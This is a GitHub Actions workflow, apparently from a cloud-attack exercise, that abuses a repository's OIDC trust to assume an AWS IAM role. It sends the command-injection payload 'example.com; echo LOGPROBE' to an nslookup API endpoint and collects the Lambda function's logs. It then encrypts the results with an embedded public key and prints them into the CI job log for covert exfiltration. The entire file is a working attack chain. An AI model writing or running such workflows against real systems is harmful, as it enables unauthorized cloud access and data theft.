name: CloudEscape OIDC probe

on:
  push:
    branches: [corgi]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Probe API and collect Lambda logs
        env:
          CLOUDESCAPE_PUBLIC_KEY: |
            -----BEGIN PUBLIC KEY-----
            MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA093h/Q9hjDQrm4tbmJm3
            v1TdeWqDGv1ZJ0KCuwHTJYere13hatLPw8FejmxxFF/5an3xQ8tuOcb7I7vFzVkX
            hcYi1/fsai9CEe8Xq+tbM67rHrunXCcBcJM5q1OHyUQQgD+oycclMPILNfvUxB+M
            /1yXt2TDc0a3XlKU6Hag86FNKHVNXmYuqbcHbai/WjQ74lN1nv2VuPok7ldbCwVZ
            i69KGFrUQv4fXxiMSD2hFFkJaAWd6chmZwvsmlBIpae1CjJilXfKLGbd0AbYNVYW
            fTD01ZHPKdHFdauUSuoM4HPlM157O/uhcnejzPwW1dZyVOZoTUjYSPFqDlbK6Hxo
            5wIDAQAB
            -----END PUBLIC KEY-----
        run: |
          set +x
          printf '%s\n' "$CLOUDESCAPE_PUBLIC_KEY" > /tmp/cloudescape.pub
          python3 -m pip install requests requests-aws4auth --quiet
          python3 - <<'PY'
          import base64, json, os, requests
          from requests_aws4auth import AWS4Auth
          auth = AWS4Auth(os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"], "us-east-1", "execute-api", session_token=os.environ["AWS_SESSION_TOKEN"])
          r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":"example.com; echo LOGPROBE"}, auth=auth, timeout=30)
          open("/tmp/api-status","w").write(str(r.status_code))
          open("/tmp/api-body","wb").write(r.content)
          PY
          set +e
          aws logs filter-log-events --log-group-name /aws/lambda/nslookupv2 --start-time "$(date -d '10 minutes ago' +%s000)" --output json > /tmp/lambda-logs.json 2>/tmp/lambda-logs-error.txt
          echo $? > /tmp/log-status
          set -e
          python3 - <<'PY'
          import base64, json, os
          def b64(path):
              return base64.b64encode(open(path,"rb").read()).decode() if os.path.exists(path) else ""
          json.dump({"api_status":open("/tmp/api-status").read(),"api_body_b64":b64("/tmp/api-body"),"log_status":open("/tmp/log-status").read().strip(),"logs_b64":b64("/tmp/lambda-logs.json"),"logs_error_b64":b64("/tmp/lambda-logs-error.txt")},open("/tmp/cloudescape-result.json","w"),separators=(",",":"))
          PY
          openssl rand -hex 32 > /tmp/cloudescape.key
          openssl pkeyutl -encrypt -pubin -inkey /tmp/cloudescape.pub -pkeyopt rsa_padding_mode:oaep -in /tmp/cloudescape.key -out /tmp/cloudescape.key.enc
          openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/cloudescape.key -in /tmp/cloudescape-result.json -out /tmp/cloudescape.result.enc
          echo "ENCRYPTED_KEY_B64=$(base64 -w0 /tmp/cloudescape.key.enc)"
          echo "ENCRYPTED_RESULT_B64=$(base64 -w0 /tmp/cloudescape.result.enc)"
